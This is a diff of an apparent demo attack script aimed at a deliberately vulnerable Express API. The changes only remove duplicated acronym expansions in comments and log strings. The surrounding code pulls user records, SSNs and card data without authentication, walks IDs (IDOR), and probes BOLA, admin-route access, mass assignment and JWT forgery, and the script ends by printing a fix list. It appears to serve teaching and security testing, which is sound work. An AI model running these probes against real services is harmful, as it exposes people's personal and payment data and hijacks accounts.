@@ -573,7 +573,7 @@ function notePlatform(title, detail) {
 //   → phaseSlowTimeout  (--skip-slow)
 //
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-//   PHASE 12  ·  Unauthenticated data theft (users / IDOR (Insecure Direct Object Reference) (Insecure Direct Object Reference) / debug / search)
+//   PHASE 12  ·  Unauthenticated data theft (users / IDOR (Insecure Direct Object Reference) / debug / search)
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 //   → phaseUnauthDataTheft
 //
@@ -593,7 +593,7 @@ function notePlatform(title, detail) {
 //   → phaseRawHeaderAbuse  (HTTPS targets skip body)
 //
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-//   PHASE 16  ·  Login, BOLA (Broken Object Level Authorization) (Broken Object Level Authorization), admin, mass assignment, JWT forge
+//   PHASE 16  ·  Login, BOLA (Broken Object Level Authorization), admin, mass assignment, JWT forge
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 //   → phaseAuthzAndForgery  (uses demoLogin)
 //
@@ -1338,7 +1338,7 @@ async function phaseSlowTimeout() {
 
 /**
  * ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
- *   PHASE 12  ·  Unauthenticated data theft (users / IDOR (Insecure Direct Object Reference) (Insecure Direct Object Reference) / debug / search)
+ *   PHASE 12  ·  Unauthenticated data theft (users / IDOR (Insecure Direct Object Reference) / debug / search)
  * ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  * Function: phaseUnauthDataTheft
  * Endpoints / wire labels:
@@ -1347,11 +1347,11 @@ async function phaseSlowTimeout() {
  *   - debug-leak   GET /api/debug/config   → may set stolen.jwtSecret
  *   - pii-search   GET /api/search?q=oslo
  *
- * JWT claim beat: full PII (Personally Identifiable Information) (Personally Identifiable Information) with no password and no token. Fills stolen.users.
+ * JWT claim beat: full PII (Personally Identifiable Information) with no password and no token. Fills stolen.users.
  */
 async function phaseUnauthDataTheft() {
-  step("Unauthenticated data theft (users / IDOR (Insecure Direct Object Reference) (Insecure Direct Object Reference) / debug / search)");
-  intent("JWT claim: no password, no token — full PII (Personally Identifiable Information) (Personally Identifiable Information). Authn was never applied.");
+  step("Unauthenticated data theft (users / IDOR (Insecure Direct Object Reference) / debug / search)");
+  intent("JWT claim: no password, no token — full PII (Personally Identifiable Information). Authn was never applied.");
 
   narrate("Dumping /api/users with zero Authorization header…");
   const usersRes = await http("GET", "/api/users", { label: "user-dump" });
@@ -1375,17 +1375,17 @@ async function phaseUnauthDataTheft() {
   }
 
   const id = stolen.users[0]?.id ?? 1;
-  narrate(`IDOR (Insecure Direct Object Reference) (Insecure Direct Object Reference): fetch /api/users/${id} still without auth…`);
+  narrate(`IDOR (Insecure Direct Object Reference): fetch /api/users/${id} still without auth…`);
   const one = await http("GET", `/api/users/${id}`, { label: "idor-user" });
   if (one.status === 200 && one.json?.user?.ssn) {
-    bad(`Full PII (Personally Identifiable Information) (Personally Identifiable Information) for user #${id}`);
+    bad(`Full PII (Personally Identifiable Information) for user #${id}`);
     loot("SSN", one.json.user.ssn);
     loot("card", one.json.user.cardNumber);
     loot("CVV", one.json.user.cardCvv);
     loot("note", one.json.user.internalNote);
     record(
       "CRITICAL",
-      "IDOR (Insecure Direct Object Reference) (Insecure Direct Object Reference) on /api/users/:id without auth",
+      "IDOR (Insecure Direct Object Reference) on /api/users/:id without auth",
       "Walk the id space — no auth, no ownership check",
       { kind: "app-code", owasp: "API1" }
     );
@@ -1406,16 +1406,16 @@ async function phaseUnauthDataTheft() {
     );
   }
 
-  narrate('Searching PII (Personally Identifiable Information) (Personally Identifiable Information) with q="oslo"…');
+  narrate('Searching PII (Personally Identifiable Information) with q="oslo"…');
   const search = await http("GET", "/api/search?q=oslo", { label: "pii-search" });
   if (search.status === 200 && (search.json?.results?.length || 0) > 0) {
-    bad(`Search returned ${search.json.results.length} PII (Personally Identifiable Information) (Personally Identifiable Information) hits without auth`);
+    bad(`Search returned ${search.json.results.length} PII (Personally Identifiable Information) hits without auth`);
     for (const r of search.json.results) {
       loot(r.email, `${r.name} | ${r.address} | ${r.ssn}`);
     }
     record(
       "HIGH",
-      "Unauthenticated PII (Personally Identifiable Information) (Personally Identifiable Information) search",
+      "Unauthenticated PII (Personally Identifiable Information) search",
       "Search exposes sensitive object properties without filtering (API3), and lacks function access control (also API5).",
       { kind: "app-code", owasp: "API3" }
     );
@@ -1575,7 +1575,7 @@ const DEMO_CREDENTIALS = [
 /**
  * Auth helper (no own PHASE banner) — runs under:
  * ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
- *   PHASE 16  ·  Login, BOLA (Broken Object Level Authorization) (Broken Object Level Authorization), admin, mass assignment, JWT forge
+ *   PHASE 16  ·  Login, BOLA (Broken Object Level Authorization), admin, mass assignment, JWT forge
  * ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  * Used by {@link phaseAuthzAndForgery}.
  * Tries DEMO_CREDENTIALS until POST /api/auth/login returns a token.
@@ -1599,7 +1599,7 @@ async function demoLogin() {
 
 /**
  * ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
- *   PHASE 16  ·  Login, BOLA (Broken Object Level Authorization) (Broken Object Level Authorization), admin, mass assignment, JWT forge
+ *   PHASE 16  ·  Login, BOLA (Broken Object Level Authorization), admin, mass assignment, JWT forge
  * ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  * Function: phaseAuthzAndForgery
  * Last phase in main() (after settings + raw TCP so forged admin JWT is the climax LOOT)
@@ -1607,7 +1607,7 @@ async function demoLogin() {
  * Endpoints / wire labels:
  *   - login:<email>       POST /api/auth/login
  *   - bola-orders         GET /api/orders           (Bearer user JWT)
- *   - admin-stats         GET /api/admin/stats      (BFLA (Broken Function Level Authorization) (Broken Function Level Authorization) — authn only)
+ *   - admin-stats         GET /api/admin/stats      (BFLA (Broken Function Level Authorization) — authn only)
  *   - cross-user-write    PUT /api/users/2          (Bob hijack)
  *   - mass-assign-admin   PUT /api/users/:id        role=admin, balance=…
  *   - jwt-alg-none        GET /api/me               (expect reject on jsonwebtoken v9)
@@ -1616,7 +1616,7 @@ async function demoLogin() {
  * Sets stolen.token, stolen.escalated, stolen.forgedAdminToken, stolen.orders.
  */
 async function phaseAuthzAndForgery() {
-  step("Login, BOLA (Broken Object Level Authorization) (Broken Object Level Authorization), admin, mass assignment, JWT forge");
+  step("Login, BOLA (Broken Object Level Authorization), admin, mass assignment, JWT forge");
   intent("JWT proves someone logged in. It does not decide what they may read or write.");
 
   const loginOk = await demoLogin();
@@ -1640,18 +1640,18 @@ async function phaseAuthzAndForgery() {
       stolen.orders.map((o) => o.userId).filter((id) => id !== loginOk.user.id)
     );
     if (others.size > 0 && loginOk.user.role !== "admin") {
-      bad(`Got ${stolen.orders.length} orders spanning ${1 + others.size} users (BOLA (Broken Object Level Authorization) (Broken Object Level Authorization))`);
+      bad(`Got ${stolen.orders.length} orders spanning ${1 + others.size} users (BOLA (Broken Object Level Authorization))`);
       for (const o of stolen.orders.slice(0, 8)) {
         loot(`Order #${o.id}`, `userId=${o.userId} ${o.merchant} $${o.amount} ····${o.cardLast4}`);
       }
       record(
         "CRITICAL",
-        "BOLA (Broken Object Level Authorization) (Broken Object Level Authorization) on /api/orders",
+        "BOLA (Broken Object Level Authorization) on /api/orders",
         "Authn present, authz missing — any login reads every order",
         { kind: "app-code", owasp: "API1" }
       );
     } else if (loginOk.user.role === "admin") {
-      info("Admin fallback cannot establish unauthorized cross-user order access; no BOLA (Broken Object Level Authorization) (Broken Object Level Authorization) finding counted");
+      info("Admin fallback cannot establish unauthorized cross-user order access; no BOLA (Broken Object Level Authorization) finding counted");
     } else {
       ok(`Orders scoped to self (${stolen.orders.length} order(s) for user #${loginOk.user.id})`);
     }
@@ -1676,14 +1676,14 @@ async function phaseAuthzAndForgery() {
       record(
         "CRITICAL",
         "Admin route accessible to a non-admin identity",
-        "Observed before role mutation: a regular user's token accesses the administrative account dump (BFLA (Broken Function Level Authorization) (Broken Function Level Authorization)).",
+        "Observed before role mutation: a regular user's token accesses the administrative account dump (BFLA (Broken Function Level Authorization)).",
         { kind: "app-code", owasp: "API5" }
       );
     } else {
-      info(`Non-admin access probe returned ${stats.status}; BFLA (Broken Function Level Authorization) (Broken Function Level Authorization) not confirmed`);
+      info(`Non-admin access probe returned ${stats.status}; BFLA (Broken Function Level Authorization) not confirmed`);
     }
   } else {
-    info("Login fallback is already admin; skip non-admin BFLA (Broken Function Level Authorization) (Broken Function Level Authorization) and privilege-escalation claims");
+    info("Login fallback is already admin; skip non-admin BFLA (Broken Function Level Authorization) and privilege-escalation claims");
   }
 
   const victimId = escId === 2 ? 1 : 2;
@@ -1829,8 +1829,8 @@ ${c.bold}${c.green}╔═══════════════════�
   );
 
   console.log(`  ${c.red}${c.bold}(app-code)${c.reset}  — fix in your handlers (framework will not invent these)
-    · Ownership (BOLA (Broken Object Level Authorization) (Broken Object Level Authorization)/IDOR (Insecure Direct Object Reference) (Insecure Direct Object Reference)): order.userId === req.user.sub — on every read AND write
-    · Roles (BFLA (Broken Function Level Authorization) (Broken Function Level Authorization)): requireRole("admin") — login alone is not enough
+    · Ownership (BOLA (Broken Object Level Authorization)/IDOR (Insecure Direct Object Reference)): order.userId === req.user.sub — on every read AND write
+    · Roles (BFLA (Broken Function Level Authorization)): requireRole("admin") — login alone is not enough
     · Request field allowlist — never merge raw JSON into user/role (kills mass
       assignment and __proto__ pollution in one move)
     · Response field allowlist — pick what you return; no ssn / cardNumber /
@@ -1945,7 +1945,7 @@ ${c.bold}${c.red}╔════════════════════
     `    ${c.blue}(framework-gap) ${c.reset}${gaps.length} — Express does not ship the control (headers, rate limit, timeout, …).`
   );
   console.log(
-    `    ${c.red}(app-code)      ${c.reset}${appHoles.length} — vulnerable routes you wrote (BOLA (Broken Object Level Authorization) (Broken Object Level Authorization), proxy, traversal, debug, …).`
+    `    ${c.red}(app-code)      ${c.reset}${appHoles.length} — vulnerable routes you wrote (BOLA (Broken Object Level Authorization), proxy, traversal, debug, …).`
   );
   console.log(
     `    ${c.yellow}◇ PLATFORM     ${c.reset}${stolen.platformNotes.length} — edge/runtime blocked a probe; does not mean the API is authorized.`
@@ -2051,7 +2051,7 @@ ${c.bold}${c.red}╔════════════════════
  *  13. phaseAccountEnumeration
  *  14. phaseSettingsMerge
  *  15. phaseRawHeaderAbuse        (HTTP only; HTTPS short-circuits body)
- *  16. phaseAuthzAndForgery       (climax: BOLA (Broken Object Level Authorization) (Broken Object Level Authorization) / admin / mass-assign / forged JWT)
+ *  16. phaseAuthzAndForgery       (climax: BOLA (Broken Object Level Authorization) / admin / mass-assign / forged JWT)
  *  ——  printReport
  */
 async function main() {
